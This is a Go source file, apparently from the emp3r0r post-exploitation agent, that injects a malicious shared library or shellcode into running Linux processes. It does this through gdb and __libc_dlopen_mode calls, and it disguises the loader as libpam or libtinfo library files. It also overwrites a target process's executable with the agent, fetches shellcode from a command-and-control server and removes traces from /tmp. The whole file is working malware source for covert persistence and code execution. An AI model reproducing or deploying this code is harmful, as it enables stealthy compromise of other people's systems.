//go:build linux
// +build linux

package agent

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"strings"
	"time"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/file"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	golpe "github.com/jm33-m0/go-lpe"
)

// inject a shared library using dlopen
func gdbInjectSOWorker(path_to_so string, pid int) error {
	gdb_path := RuntimeConfig.UtilsPath + "/gdb"
	if !util.IsExist(gdb_path) {
		res := VaccineHandler()
		if !strings.Contains(res, "success") {
			return fmt.Errorf("Download gdb via VaccineHandler: %s", res)
		}
	}

	temp := "/tmp/emp3r0r"
	if util.IsExist(temp) {
		os.RemoveAll(temp) // ioutil.WriteFile returns "permission denied" when target file exists, can you believe that???
	}
	err := CopySelfTo(temp)
	if err != nil {
		return err
	}
	// cleanup
	defer func() {
		time.Sleep(3 * time.Second)
		err = os.Remove("/tmp/emp3r0r")
		if err != nil {
			log.Printf("Delete /tmp/emp3r0r: %v", err)
		}
	}()

	if pid == 0 {
		cmd := exec.Command("sleep", "10")
		err := cmd.Start()
		if err != nil {
			return err
		}
		pid = cmd.Process.Pid
	}

	gdb_cmd := fmt.Sprintf(`echo 'print __libc_dlopen_mode("%s", 2)' | %s -p %d`,
		path_to_so,
		gdb_path,
		pid)
	out, err := exec.Command(RuntimeConfig.UtilsPath+"/bash", "-c", gdb_cmd).CombinedOutput()
	if err != nil {
		return fmt.Errorf("%s: %s\n%v", gdb_cmd, out, err)
	}

	return nil
}

// Inject loader.so into any process
func GDBInjectSO(pid int) error {
	so_path, err := prepare_injectSO(pid)
	if err != nil {
		return err
	}
	return gdbInjectSOWorker(so_path, pid)
}

func prepare_injectSO(pid int) (so_path string, err error) {
	so_path = fmt.Sprintf("/%s/libtinfo.so.2.1.%d",
		RuntimeConfig.UtilsPath, util.RandInt(0, 30))
	if os.Geteuid() == 0 {
		root_so_path := fmt.Sprintf("/usr/lib/x86_64-linux-gnu/libpam.so.1.%d.1", util.RandInt(0, 20))
		so_path = root_so_path
	}
	if !util.IsExist(so_path) {
		out, err := golpe.ExtractFileFromString(file.LoaderSO_Data)
		if err != nil {
			return "", fmt.Errorf("Extract loader.so failed: %v", err)
		}
		err = ioutil.WriteFile(so_path, out, 0644)
		if err != nil {
			return "", fmt.Errorf("Write loader.so failed: %v", err)
		}
	}
	return
}

// prepare for guardian_shellcode injection, targeting pid
func prepare_guardian_sc(pid int) (shellcode string, err error) {
	// prepare guardian_shellcode
	proc_exe := util.ProcExe(pid)
	// backup original binary
	err = CopyProcExeTo(pid, RuntimeConfig.AgentRoot+"/"+util.FileBaseName(proc_exe))
	if err != nil {
		return "", fmt.Errorf("failed to backup %s: %v", proc_exe, err)
	}
	err = CopySelfTo(proc_exe)
	if err != nil {
		return "", fmt.Errorf("failed to overwrite %s with emp3r0r: %v", proc_exe, err)
	}
	sc := gen_guardian_shellcode(proc_exe)

	return sc, nil
}

// InjectorHandler handles `injector` module
func InjectorHandler(pid int, method string) (err error) {
	// prepare the shellcode
	prepare_sc := func() (shellcode string, shellcodeLen int) {
		sc, err := DownloadViaCC("shellcode.txt", "")

		if err != nil {
			log.Printf("Failed to download shellcode.txt from CC: %v", err)
			// prepare guardian_shellcode
			emp3r0r_data.GuardianShellcode, err = prepare_guardian_sc(pid)
			if err != nil {
				log.Printf("Failed to prepare_guardian_sc: %v", err)
				return
			}
			sc = []byte(emp3r0r_data.GuardianShellcode)
		}
		shellcode = string(sc)
		shellcodeLen = strings.Count(string(shellcode), "0x")
		log.Printf("Collected %d bytes of shellcode, preparing to inject", shellcodeLen)
		return
	}

	// dispatch
	switch method {
	case "gdb_loader":
		err = CopySelfTo("/tmp/emp3r0r")
		if err != nil {
			return
		}
		err = GDBInjectSO(pid)
		if err == nil {
			err = os.RemoveAll("/tmp/emp3r0r")
			if err != nil {
				return
			}
		}
	case "inject_shellcode":
		shellcode, _ := prepare_sc()
		err = ShellcodeInjector(&shellcode, pid)
		if err != nil {
			return
		}

		// restore original binary
		err = CopyProcExeTo(pid, util.ProcExe(pid)) // as long as the process is still running
	case "inject_loader":
		err = CopySelfTo("/tmp/emp3r0r")
		if err != nil {
			return
		}
		err = InjectSO(pid)
		if err == nil {
			err = os.RemoveAll("/tmp/emp3r0r")
		}
	default:
		err = fmt.Errorf("%s is not supported", method)
	}
	return
}

func injectSOWorker(so_path string, pid int) (err error) {
	dlopen_addr := GetSymFromLibc(pid, "__libc_dlopen_mode")
	if dlopen_addr == 0 {
		return fmt.Errorf("failed to get __libc_dlopen_mode address for %d", pid)
	}
	shellcode := gen_dlopen_shellcode(so_path, dlopen_addr)
	if len(shellcode) == 0 {
		return fmt.Errorf("failed to generate dlopen shellcode")
	}
	return ShellcodeInjector(&shellcode, pid)
}

// InjectSO inject loader.so into any process, using shellcode
// locate __libc_dlopen_mode in memory then use it to load SO
func InjectSO(pid int) error {
	so_path, err := prepare_injectSO(pid)
	if err != nil {
		return err
	}
	defer os.RemoveAll("/tmp/emp3r0r") // in case we have this file remaining on disk
	return injectSOWorker(so_path, pid)
}
